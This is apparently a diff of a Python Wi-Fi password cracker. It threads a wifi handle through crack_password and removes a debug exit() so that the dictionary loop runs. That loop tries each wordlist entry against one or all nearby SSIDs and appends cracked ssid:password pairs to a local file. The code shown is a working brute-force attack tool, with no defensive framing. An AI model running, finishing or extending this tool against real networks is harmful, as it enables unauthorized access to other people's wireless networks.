@@ -47,7 +47,7 @@ logging.basicConfig(
 
 # type = False
 
-def crack_password(ssid, password, number, verbose=False):
+def crack_password(wifi, ssid, password, number, verbose=False):
     profile = Profile()  # create profile instance
     profile.ssid = ssid  # name of client
     profile.auth = const.AUTH_ALG_OPEN  # auth algo
@@ -92,7 +92,6 @@ def crack_password(ssid, password, number, verbose=False):
 
 # opening and reading the file
 def crack_loop(ssid, file, verbose=False):
-
     wifi = helpers.wifi.Wifi(verbose)
 
     print(YELLOW)
@@ -105,27 +104,21 @@ def crack_loop(ssid, file, verbose=False):
     else:
         ssids = [ssid]
     print(ssids)
-    exit()
-    number = 0
-    # with open(file, 'r', encoding='utf8') as words:
-    words = get_filehandle(file)
 
+    number = 0
+    words = get_filehandle(file)
     for line in words:
         number += 1
-        # line = line.split("\n")
-        # pwd = line.strip('\r').strip('\n').strip()
         try:
-            # url
+            # url / ssh
             pwd = line.decode('utf-8').strip().strip('\r').strip('\n')
         except:
             # file
             pwd = line.strip().strip('\r').strip('\n')
-            pass
         for ssid in ssids:
-            # ssid = network.ssid
             print(YELLOW)
             print(f"[{number}] Trying {ssid} with {pwd}")
-            if crack_password(ssid, pwd, number, verbose=False):
+            if crack_password(wifi, ssid, pwd, number, verbose=False):
                 print(DARK_WHITE, f"saving {ssid}:{pwd} to ../data/ssid-cracked.txt")
                 with open('../data/ssid-cracked.txt', 'a') as out:
                     out.write(f"{ssid}:{pwd}")
@@ -139,14 +132,13 @@ def check_params():
     parser = get_argument_parser()
     args = parser.parse_args()
 
-    print(DARK_CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
-    time.sleep(1.5)
-
     ssid = args.ssid
     filee = args.file
     verbose = args.verbose
     all = args.all
-
+    #
+    #   one ssid or -a must be specified
+    #
     if not any((ssid, all)):
         print(RED, MINUS, "one of ssid/all must be specified")
         exit()
@@ -154,8 +146,10 @@ def check_params():
         print(YELLOW, PLUS, "setting loop for all networks")
         ssid = "*ALL*"
 
+    print(DARK_CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
     print(CYAN, PLUS, f"ssid: {ssid}")
     print(CYAN, PLUS, f"file: {filee}", RESET)
+    time.sleep(1.5)
     return ssid, filee, verbose
 
 
